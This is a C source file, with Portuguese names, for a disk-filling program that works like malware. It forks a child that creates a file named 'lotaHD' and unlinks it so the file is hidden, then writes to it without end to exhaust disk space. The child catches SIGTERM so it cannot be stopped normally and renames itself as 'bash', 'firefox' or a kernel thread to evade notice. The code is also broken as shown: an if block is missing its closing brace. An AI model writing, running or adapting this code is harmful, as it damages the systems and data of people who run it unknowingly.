/*
 * progacao1.c
 *
 * Compila com:
 * $ gcc progacao1.c -o progacao1 -O2 -std=gnu11 -Wall
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void acao(void);
void troca_nome(void);
void nao_deixa_fechar(int);

char *nome_executavel = NULL;

int main(int argc, char *argv[])
{
	int i;

	nome_executavel = argv[0];

	i = fork();
	if (i == 0)
		acao();

	return 0;
}

void acao(void)
{
	FILE *arquivo = NULL;
	char *buf = "1234567890";

	struct stat inode_diretorio;
	char diretorio[12];

	strcpy(diretorio, "./");
	stat(diretorio, &inode_diretorio);
	if (!((inode_diretorio.st_mode & S_IWUSR) || (inode_diretorio.st_mode & S_IWGRP) || 
							(inode_diretorio.st_mode & S_IWOTH))) {
		strcpy(diretorio, "/tmp/");

	strcat(diretorio, "lotaHD");

	arquivo = fopen(diretorio, "a");
	if (arquivo == NULL)
		exit(EXIT_FAILURE);

	unlink(diretorio);

	signal(SIGTERM, nao_deixa_fechar);
	signal(SIGALRM, nao_deixa_fechar);
	alarm(5);

	setvbuf(arquivo, NULL, _IONBF, 0);
	while (true)
		fprintf(arquivo, "%s", buf);
}

void nao_deixa_fechar(int signal) {
	troca_nome();
}

void troca_nome(void) {
	const char *lista_nomes[] = {"[kdevtmpfs]", "bash", "lightdm", "firefox", NULL};
	int indice;

	srand(time(NULL));
	indice = rand() % 4;
	strcpy(nome_executavel, lista_nomes[indice]); 
}
